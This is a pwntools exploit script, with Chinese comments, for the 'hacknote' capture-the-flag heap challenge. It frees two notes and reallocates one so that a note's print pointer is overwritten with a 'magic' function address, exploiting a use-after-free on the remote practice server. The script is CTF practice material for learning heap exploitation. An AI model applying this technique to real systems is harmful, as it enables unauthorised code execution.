from pwn import *

context(os='linux', arch='i386')
p = remote('node4.buuoj.cn', 27283)
# p = process('./hacknote)
# gdb.attach(p)

'''
limit:
- 最多malloc 5次
- 好像没有写堆块的函数
- free之后没有将指针置为0
'''

'''
思路：
unsorted bin泄露Libc
_malloc_hook地方写入magic函数地址 ❌

正确的思路是，UAF漏洞，修改puts函数地址为magic
'''

magic_func = 0x08048945

def add_note(size: int, content: bytes):
    p.sendline(b'1')
    p.recvuntil(b'Note size :')
    p.sendline(str(size).encode())
    p.recvuntil(b'Content :')
    p.sendline(content)

def del_note(index: int):
    p.sendline(b'2')
    p.sendlineafter(b'Index :', str(index).encode())

def print_note(index: int):
    p.sendline(b'3')
    p.sendlineafter(b'Index :', str(index).encode())

# Method 1:
# add_note(8, b'aaaa')
# del_note(0)
# del_note(0)
# add_note(13, b'bbbb')
# add_note(8, p32(magic_func))
# print_note(0)
# p.interactive()
    
# Method 2: 下面这种更好理解一点
# 正是因为UAF的存在，所以在free之后还可以执行print_note(0)
add_note(13, b'aaaa')
add_note(13, b'bbbb')
del_note(0)
del_note(1)
add_note(8, p32(magic_func))
print_note(0)
p.interactive()